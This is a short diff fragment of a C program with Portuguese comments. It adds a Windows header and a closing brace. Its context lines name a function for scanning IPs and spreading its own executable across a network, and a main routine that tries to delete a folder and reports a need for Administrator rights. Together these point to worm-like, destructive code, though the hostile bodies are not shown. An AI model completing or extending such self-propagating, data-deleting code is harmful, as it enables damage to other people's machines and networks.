@@ -1,6 +1,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <windows.h>
 
 // Função para buscar IPs e tentar a propagação
 void propagar_na_rede(const char *meu_executavel) {
@@ -75,6 +76,7 @@ int main(int argc, char *argv[]) {
     } else {
         printf("Erro ao tentar remover a pasta. Verifique permissões de Administrador.\n");
     }
+}
     
 // ... [Suas funções anteriores aqui] ...
 
